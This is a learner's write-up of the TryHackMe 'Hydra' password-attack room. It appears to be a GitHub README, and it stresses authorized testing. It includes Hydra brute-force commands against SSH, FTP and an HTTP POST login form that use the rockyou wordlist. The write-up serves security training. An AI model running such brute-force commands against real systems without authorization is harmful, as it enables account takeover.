# Hydra

## Room Information

- **Platform:** TryHackMe
- **Room:** Hydra
- **Difficulty:** Easy
- **Category:** Password Attacks

---

# Objective

The objective of this room was to learn how to use Hydra, a fast and powerful password-cracking tool, to perform authorized brute-force attacks against various network services and understand its role in penetration testing.

---

# Topics Covered

- Introduction to Hydra
- Brute Force Attacks
- Dictionary Attacks
- Username Enumeration
- Wordlists
- SSH Authentication
- FTP Authentication
- HTTP POST Login Forms
- Service Enumeration

---

# Commands Practiced

## SSH Brute Force

```bash
hydra -l admin -P rockyou.txt ssh://<TARGET_IP>
```

## FTP Brute Force

```bash
hydra -l admin -P rockyou.txt ftp://<TARGET_IP>
```

## HTTP POST Login Form

```bash
hydra -l admin -P rockyou.txt <TARGET_IP> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```

---

# Key Learnings

- Hydra supports brute-force attacks against multiple network protocols.
- Strong wordlists improve the effectiveness of password testing.
- Correct command syntax depends on the target service.
- Password attacks should only be performed on systems you own or are authorized to test.
- Weak passwords can be identified through authorized security assessments.

---

# Skills Gained

- Hydra
- Password Auditing
- Brute Force Techniques
- SSH Authentication
- FTP Authentication
- HTTP Authentication
- Linux Command Line

---


## Room Completion

<img width="1902" height="605" alt="hydra" src="https://github.com/user-attachments/assets/8093f9b8-439c-4e87-88a4-e0adb3fc5486" /> 


---

# Screenshots of the steps performed to get flags
<img width="1668" height="878" alt="image" src="https://github.com/user-attachments/assets/b743cf37-dad6-47a2-bcff-306bf6e9e85f" />

<img width="1668" height="878" alt="image" src="https://github.com/user-attachments/assets/4a726252-aab2-4f9d-babd-1e90c330c27a" />
















# Lessons Learned

This room introduced Hydra as a powerful password auditing tool and reinforced the importance of strong passwords, secure authentication practices, and ethical use of penetration testing tools.
